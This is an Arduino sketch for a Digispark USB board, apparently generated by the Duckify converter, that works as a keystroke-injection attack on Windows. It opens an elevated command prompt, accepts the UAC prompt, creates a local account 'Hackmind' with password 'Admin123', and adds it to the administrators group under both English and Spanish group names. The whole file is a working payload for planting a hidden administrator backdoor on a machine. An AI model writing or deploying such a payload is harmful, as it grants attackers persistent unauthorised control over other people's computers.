// [ ===== Created using duckify.huhn.me @ dev 356a9805 ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Digispark
// Keyboard Layout: ES

#include "DigiKeyboard.h"

// CMD
const uint8_t key_arr_0[] PROGMEM = {2,6, 2,16, 2,7};
// net user /add Hackmind Admin123
const uint8_t key_arr_1[] PROGMEM = {0,17, 0,8, 0,23, 0,44, 0,24, 0,22, 0,8, 0,21, 0,44, 2,36, 0,4, 0,7, 0,7, 0,44, 2,11, 0,4, 0,6, 0,14, 0,16, 0,12, 0,17, 0,7, 0,44, 2,4, 0,7, 0,16, 0,12, 0,17, 0,30, 0,31, 0,32};
// net localgroup administrators Hackmind /add
const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,44, 0,15, 0,18, 0,6, 0,4, 0,15, 0,10, 0,21, 0,18, 0,24, 0,19, 0,44, 0,4, 0,7, 0,16, 0,12, 0,17, 0,12, 0,22, 0,23, 0,21, 0,4, 0,23, 0,18, 0,21, 0,22, 0,44, 2,11, 0,4, 0,6, 0,14, 0,16, 0,12, 0,17, 0,7, 0,44, 2,36, 0,4, 0,7, 0,7};
// net localgroup administradores Hackmind /add
const uint8_t key_arr_3[] PROGMEM = {0,17, 0,8, 0,23, 0,44, 0,15, 0,18, 0,6, 0,4, 0,15, 0,10, 0,21, 0,18, 0,24, 0,19, 0,44, 0,4, 0,7, 0,16, 0,12, 0,17, 0,12, 0,22, 0,23, 0,21, 0,4, 0,7, 0,18, 0,21, 0,8, 0,22, 0,44, 2,11, 0,4, 0,6, 0,14, 0,16, 0,12, 0,17, 0,7, 0,44, 2,36, 0,4, 0,7, 0,7};
// exit
const uint8_t key_arr_4[] PROGMEM = {0,8, 0,27, 0,12, 0,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(21, 8); // GUI R
    DigiKeyboard.delay(500);
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING CMD
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 3); // CTRL SHIFT ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(80, 0); // LEFT
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.delay(500);
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING net user /add Hackmind Admin123
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(2000); // DELAY 2000
    DigiKeyboard.delay(500);
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING net localgroup administrators Hackmind ...
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING net localgroup administradores Hackmind...
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.delay(500);
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING exit
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500);
}

void loop() {}

// Created using duckify.huhn.me @ dev 356a9805
